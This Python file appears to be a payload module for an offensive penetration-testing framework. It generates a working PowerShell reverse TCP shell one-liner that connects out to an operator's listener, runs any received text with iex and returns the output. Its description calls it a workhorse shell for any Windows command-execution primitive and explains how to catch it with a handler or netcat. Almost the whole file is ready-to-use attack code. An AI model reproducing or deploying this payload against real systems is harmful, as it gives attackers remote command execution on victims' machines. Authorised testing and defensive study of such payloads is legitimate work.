"""PowerShell reverse TCP shell one-liner (Windows targets)."""

from core.module import PayloadModule
from core.options import OptAddress, OptPort

TEMPLATE = (
    "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient("
    "'{lhost}',{lport});$stream = $client.GetStream();"
    "[byte[]]$bytes = 0..65535|%{{0}};"
    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
    "$sendback = (iex $data 2>&1 | Out-String );"
    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
    "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
)


class PowershellReverseTcp(PayloadModule):
    name = "PowerShell Reverse Shell"
    description = """
        The workhorse Windows reverse shell: pure System.Net.Sockets, no
        external binaries, -nop skips profiles. Deliver via any Windows
        command-execution primitive. Catch it with exploits/multi/handler
        or nc -lvnp <LPORT>. Pairs naturally with the ps_base64 encoder
        for delivery through cmd.exe quoting hell.
    """
    authors = ["you"]

    def register_options(self):
        self.options.add(OptAddress("LHOST", required=True,
                                    description="Your listener IP"))
        self.options.add(OptPort("LPORT", default=4444, description="Your listener port"))

    def generate(self):
        return TEMPLATE.format(
            lhost=self.get_option("LHOST"),
            lport=self.get_option("LPORT"),
        )
